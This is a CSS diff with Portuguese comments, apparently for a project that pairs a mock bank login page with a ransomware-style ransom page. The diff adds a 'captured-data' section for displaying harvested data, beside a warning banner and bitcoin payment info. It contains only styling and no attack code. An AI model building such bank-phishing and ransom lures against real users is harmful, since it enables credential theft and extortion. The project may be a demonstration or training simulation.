@@ -1,4 +1,4 @@
-/* --- Estilos Globais e do Ransomware (Mantidos ou Ajustados) --- */
+/* --- Estilos Globais e do Ransomware --- */
 body {
     font-family: 'Courier New', Courier, monospace; /* Padrão para ransomware, mas mudaremos para banco */
     margin: 0;
@@ -21,7 +21,7 @@ body {
     font-size: 0.9em;
     font-weight: bold;
     border-bottom: 1px solid #FF0000; /* Borda na parte inferior do banner */
-    box-shadow: 0 0 15px rgba(0, 255, 0, 0.5);
+    box-shadow: 0 0 15px rgba(255, 0, 0, 0.5);
     z-index: 1000; /* Garante que fique acima de outros elementos */
     box-sizing: border-box; /* Inclui padding na largura total */
     text-align: center; /* Centraliza o texto */
@@ -32,10 +32,44 @@ body {
 body:not(.bank-page) { /* Aplica se o body NÃO TIVER a classe 'bank-page' */
     background-color: #000;
     color: #0F0; /* Verde neon para simular terminal */
-    justify-content: center; /* Centraliza verticalmente o conteúdo para o ransomware */
-    align-items: center;   /* Centraliza horizontalmente o conteúdo para o ransomware */
-    padding-top: 80px; /* Espaço para o banner fixo */
+    padding-top: 100px; /* Aumenta o padding superior para dar espaço ao banner e conteúdo */
+    padding-bottom: 20px; /* Adiciona padding na parte inferior do body */
+    align-items: center; /* Centraliza horizontalmente o conteúdo */
 }
+
+/* Estilos para a seção de dados capturados (AGORA NO style.css) */
+.captured-data {
+    background-color: #ff000033; /* Vermelho semi-transparente */
+    border: 1px dashed #FF0000;
+    padding: 20px; /* Aumenta o padding interno para mais espaço */
+    margin-top: 30px; /* Mais espaço do banner de aviso */
+    margin-bottom: 30px; /* Mais espaço do container principal */
+    border-radius: 5px;
+    text-align: left;
+    font-size: 1.1em;
+    color: #FF0; /* Amarelo para destaque */
+    box-shadow: 0 0 10px rgba(255, 0, 0, 0.4);
+    max-width: 800px; /* Alinhar com o container principal */
+    width: 90%;
+    box-sizing: border-box;
+    align-self: center; /* Garante centralização caso o pai não seja flex */
+    line-height: 1.6; /* Aumenta o espaçamento entre linhas */
+}
+.captured-data h2 {
+    color: #F00;
+    margin-top: 0;
+    text-align: center;
+    font-size: 1.5em; /* Ajusta o tamanho do título */
+    margin-bottom: 15px; /* Espaço abaixo do título */
+}
+.captured-data p {
+    margin-bottom: 8px; /* Ajusta espaçamento entre parágrafos */
+}
+.captured-data .highlight-red {
+    color: #F00;
+    font-weight: bold;
+}
+
 
 body:not(.bank-page) .container {
     background-color: #1a1a1a;
@@ -46,6 +80,7 @@ body:not(.bank-page) .container {
     max-width: 800px;
     width: 90%;
     box-sizing: border-box;
+    /* margin-top: 0; */ /* Removido, o margin-bottom do captured-data já cria o espaço */
     margin-bottom: 30px; /* Mantém a margem inferior para rolagem */
 }
 
@@ -80,8 +115,7 @@ body:not(.bank-page) .bitcoin-info {
 }
 
 
-/* --- NOVOS ESTILOS PARA A PÁGINA DE BANCO (index.php) --- */
-
+/* --- ESTILOS PARA A PÁGINA DE BANCO (index.php) --- */
 .bank-page { /* Aplica se o body TIVER a classe 'bank-page' */
     font-family: Arial, sans-serif;
     background-color: #f0f2f5; /* Um cinza claro para o fundo */
@@ -275,9 +309,22 @@ body:not(.bank-page) .bitcoin-info {
 
     /* Ajuste para o body em telas menores para o ransomware.php (antigo index.php) */
     body:not(.bank-page) {
-        padding-top: 70px; /* Ajusta o padding para o banner menor */
+        padding-top: 90px; /* Ajusta o padding para o banner e o novo bloco */
         padding-left: 15px;
         padding-right: 15px;
+    }
+    .captured-data {
+        padding: 15px; /* Reduz padding interno do captured-data */
+        margin-top: 20px;
+        margin-bottom: 20px;
+        font-size: 1em;
+    }
+    .captured-data h2 {
+        font-size: 1.3em;
+        margin-bottom: 10px;
+    }
+    .captured-data p {
+        margin-bottom: 5px;
     }
     body:not(.bank-page) .container {
         padding: 30px;
@@ -357,9 +404,19 @@ body:not(.bank-page) .bitcoin-info {
 
     /* Ajuste para o body em telas muito pequenas para o ransomware.php (antigo index.php) */
     body:not(.bank-page) {
-        padding-top: 60px; /* Mais ajuste de padding para o banner menor */
+        padding-top: 70px; /* Mais ajuste de padding para o banner e o novo bloco */
         padding-left: 10px;
         padding-right: 10px;
+    }
+    .captured-data {
+        padding: 10px; /* Mais redução de padding interno */
+        margin-top: 15px;
+        margin-bottom: 15px;
+        font-size: 0.9em;
+    }
+    .captured-data h2 {
+        font-size: 1.2em;
+        margin-bottom: 8px;
     }
     body:not(.bank-page) .container {
         padding: 20px;
